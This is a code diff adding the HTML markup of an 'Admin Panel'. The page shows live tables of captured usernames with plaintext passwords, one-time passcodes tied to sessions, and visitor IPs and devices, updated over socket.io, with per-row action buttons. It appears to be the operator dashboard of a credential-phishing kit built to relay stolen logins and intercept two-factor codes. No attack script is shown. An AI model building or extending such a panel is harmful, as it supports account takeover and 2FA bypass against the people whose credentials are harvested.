@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <link rel="stylesheet" href="/admin-static/style.css">
+</head>
+<body>
+  <div class="admin-shell">
+    <header>
+      <div>
+        <h1>Admin Panel</h1>
+        <p>Real-time login, OTP, and access event monitoring.</p>
+      </div>
+      <div class="status">Connected: <span id="status">no</span></div>
+    </header>
+
+    <div class="admin-controls">
+      <div class="admin-control-panel">
+        <h2>Admin settings</h2>
+        <form id="admin-update-form">
+          <label>New username
+            <input type="text" name="username" placeholder="New admin username">
+          </label>
+          <label>New password
+            <input type="password" name="password" placeholder="New admin password">
+          </label>
+          <button type="submit" class="btn-update">Update credentials</button>
+        </form>
+      </div>
+      <div class="admin-control-panel logout-panel">
+        <h2>Session</h2>
+        <a class="btn-logout" href="/admin/logout">Logout</a>
+      </div>
+    </div>
+
+    <div id="toast" class="toast hidden"></div>
+
+    <section class="panels">
+      <div class="panel">
+        <h2>Login records</h2>
+        <table id="login-table">
+          <thead>
+            <tr><th>Username</th><th>Password</th><th>Session</th><th>Time</th><th>Action</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <div class="panel">
+        <h2>OTP records</h2>
+        <table id="otp-table">
+          <thead>
+            <tr><th>Code</th><th>Session</th><th>Time</th><th>Action</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <div class="panel">
+        <h2>Access events</h2>
+        <table id="access-table">
+          <thead>
+            <tr><th>IP</th><th>Device</th><th>Message</th><th>Time</th><th>Action</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <div class="panel">
+        <h2>Activity log</h2>
+        <table id="activity-table">
+          <thead>
+            <tr><th>Event</th><th>Time</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/admin-static/admin.js"></script>
+</body>
+</html>
